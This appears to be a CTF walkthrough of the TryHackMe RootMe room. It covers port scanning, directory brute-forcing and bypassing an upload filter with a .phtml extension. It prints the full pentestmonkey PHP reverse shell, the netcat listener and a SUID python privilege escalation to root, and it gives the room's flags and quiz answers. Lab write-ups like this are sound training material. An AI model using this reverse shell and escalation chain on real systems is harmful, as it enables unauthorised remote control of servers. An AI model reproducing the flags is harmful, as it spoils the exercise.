# TryHackMe RootMe-CTF WriteUp
<img width="1100" height="542" alt="image" src="https://github.com/user-attachments/assets/b909c54c-8c5b-4a2f-b148-caef57842165" />


The tryhackme RootMe is a good CTF to test your boot to root machine skills.

The link to room is https://tryhackme.com/room/rrootme

## Tools We Will Use

1. Nmap
2. GoBuster
3. Netcat

## Service Enumeration

### Step 1: Scan the Machine With Nmap

Command we will use:

```bash
nmap -A -T4 <Target-Ip> -vv -oN scan.txt
-A for Aggressive scan
-vv for verbose
-oN saves the output in scan.txt
```
<img width="1400" height="378" alt="image" src="https://github.com/user-attachments/assets/9ffdb4c7-a367-4278-af28-bbeb89d3c53e" />

Questions
How many ports are open?

2

What version of Apache is running?

2.4.41

What service is running on port 22?

SSH

Directory Brute Force

Start Gobuster on the target:
```bash
gobuster dir -u http://<lab-ip>/ -w /usr/share/wordlists/dirb/common.txt -o recon.txt

The answer is:

/panel/
```
we got

<img width="1057" height="550" alt="image" src="https://github.com/user-attachments/assets/ca60b105-3466-46c1-9b66-b5bd12d9608c" />

i visited that page i got this

<img width="1400" height="607" alt="image" src="https://github.com/user-attachments/assets/b084f992-7706-4ed2-8d20-f12c21ac250f" />

here i can see that i can upload the file here i would try to get a reverse shell but this site uses protection against malicious file upload that we cannot upload a file named shell.php if we upload this the site will reject this so we have to use bypass this filter we can do it by naming out file

```bash
shell.phtml
```
and then site will accept this

<img width="1400" height="591" alt="image" src="https://github.com/user-attachments/assets/f544af72-3c80-457f-a6c1-7792c27d327d" />

we got

you need to upload a php reverse shell given below

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '';  // CHANGE THIS TO YOUR IP ADDRESS
$port = 1234;       // CHANGE THIS (OPTIONAL IF YOU ARE COMFORTABLE WITH THIS PORT)
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
 // Fork and have the parent process exit
 $pid = pcntl_fork();
 
 if ($pid == -1) {
  printit("ERROR: Can't fork");
  exit(1);
 }
 
 if ($pid) {
  exit(0);  // Parent exits
 }

 // Make the current process a session leader
 // Will only succeed if we forked
 if (posix_setsid() == -1) {
  printit("Error: Can't setsid()");
  exit(1);
 }

 $daemon = 1;
} else {
 printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
 printit("$errstr ($errno)");
 exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
 printit("ERROR: Can't spawn shell");
 exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
 // Check for end of TCP connection
 if (feof($sock)) {
  printit("ERROR: Shell connection terminated");
  break;
 }

 // Check for end of STDOUT
 if (feof($pipes[1])) {
  printit("ERROR: Shell process terminated");
  break;
 }

 // Wait until a command is end down $sock, or some
 // command output is available on STDOUT or STDERR
 $read_a = array($sock, $pipes[1], $pipes[2]);
 $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

 // If we can read from the TCP socket, send
 // data to process's STDIN
 if (in_array($sock, $read_a)) {
  if ($debug) printit("SOCK READ");
  $input = fread($sock, $chunk_size);
  if ($debug) printit("SOCK: $input");
  fwrite($pipes[0], $input);
 }

 // If we can read from the process's STDOUT
 // send data down tcp connection
 if (in_array($pipes[1], $read_a)) {
  if ($debug) printit("STDOUT READ");
  $input = fread($pipes[1], $chunk_size);
  if ($debug) printit("STDOUT: $input");
  fwrite($sock, $input);
 }

 // If we can read from the process's STDERR
 // send data down tcp connection
 if (in_array($pipes[2], $read_a)) {
  if ($debug) printit("STDERR READ");
  $input = fread($pipes[2], $chunk_size);
  if ($debug) printit("STDERR: $input");
  fwrite($sock, $input);
 }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
 if (!$daemon) {
  print "$string\n";
 }
}

?>
```
## Step 1
start a listner on attacker machine
```bash
nc -lnvp 1234
```
then upload a file and then navigate to this path
```bash
http://<lab ip>/uploads
```
You will see:
<img width="1400" height="474" alt="image" src="https://github.com/user-attachments/assets/3919fe32-71c2-46ed-96c7-d6f553f94a32" />

click on
```bash
shell.phtml
```
and you will get a reverse shell

<img width="990" height="167" alt="image" src="https://github.com/user-attachments/assets/19514e7d-172b-45be-ba69-f3d4ec2bc7b2" />

first step is to stabilize your shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
then find the user.txt file

that is located on this path

```bash
cat /var/wwww/user.txt
```
the flag is
```bash
THM{y0u_g0t_a_sh3l}
```
final Step is Privilege Escalation

to find SUID binaries you need to know what are these binaries

these are the binaries that any user can run witout being a root user

run the command this will give you all the SUID binaries
```bash
find / -user root -perm /4000 2>/dev/null
```
you will see

<img width="652" height="612" alt="image" src="https://github.com/user-attachments/assets/0cf1b26e-7972-4758-a2c5-08f806386884" />

the intresting file is 
```bash
/usr/bin/python
```
because its not a standard SUID binary on a Unix System

Search for files with SUID permission, which file is weird?

```bash
/usr/bin/python
```
next step is to find a way of privilege escalation the most useful way for this if gtfobins.org

Press enter or click to view image in full size

<img width="1400" height="544" alt="image" src="https://github.com/user-attachments/assets/f3a17f14-310d-4ba1-bed0-3c0edf606f1f" />

click on the fist result that syas Python

you will see this command

<img width="842" height="465" alt="image" src="https://github.com/user-attachments/assets/d186455d-b9d5-451b-a68a-9c703468080a" />

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
then find the root.txt flag navigate to the

```bash
cd /root
cat root.txt
```
and the flag is

```bash
THM{pr1v1l3g3_3sc4l4t10n}
```
i think this will help you people and drop your comments

written by muhammad zaid

Happy Hacking!!!!

## Connect With Me on Other platform 
Linkedin Profile : https://www.linkedin.com/in/muhammad-zaid2009/
TryHackMe Profile : https://tryhackme.com/p/muhammadzaid2009
Medium Profile : https://medium.com/@muhammadzaid2009
